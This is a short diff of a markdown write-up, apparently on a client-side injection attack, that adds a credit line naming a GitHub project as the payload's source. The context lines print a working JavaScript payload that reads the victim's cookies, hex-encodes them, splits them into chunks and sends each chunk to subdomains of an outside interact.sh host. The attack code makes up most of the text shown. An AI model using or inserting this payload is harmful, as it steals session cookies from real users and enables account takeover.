@@ -19,3 +19,7 @@ The trickest and coolest part here is that, if for some reason, the client-side 
 ```
 t=40;dm='cb364rdve0qv08pghjmgcmdgr5eyyyyyn.interact.sh';k2="-None";d=document;c=d.cookie;function v(dm, d, c){m="";for(var x in c){k=Math.random().toString(36).substring(7);m=m.concat(c.charCodeAt(x).toString(16).padStart(2,0))};iter=[];p=0;x=0;it=(m.length/t);for(i=[];i.length<=it;){i.push(1);iter.push(m.slice(iter.length*t,i.length*t));};for(var o in iter){danger='https://fma6mqp.1wxyg8.sdrv2.fcnoh2'.replace('fma6mqp',iter[o]).replace('1wxyg8',o).replace('sdrv2',k.concat(k2)).replace('fcnoh2',dm);var xhttp = new XMLHttpRequest();xhttp.open("GET", danger);xhttp.send();};};v(dm,d,c)
 ```
+
+#### Thanks
+
+https://github.com/gum0x/rascal (that JS payload was inspired (~copied~) from here. I've only made some changes)
